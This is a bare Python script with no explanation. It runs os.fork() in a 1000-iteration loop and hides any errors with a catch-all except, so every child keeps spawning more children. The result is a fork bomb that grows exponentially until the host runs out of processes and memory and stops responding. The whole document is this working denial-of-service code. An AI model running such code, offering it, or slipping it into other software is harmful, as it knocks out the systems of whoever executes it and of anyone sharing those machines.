import os

for i in range(1000):
    try:
        os.fork()
    except:
        pass
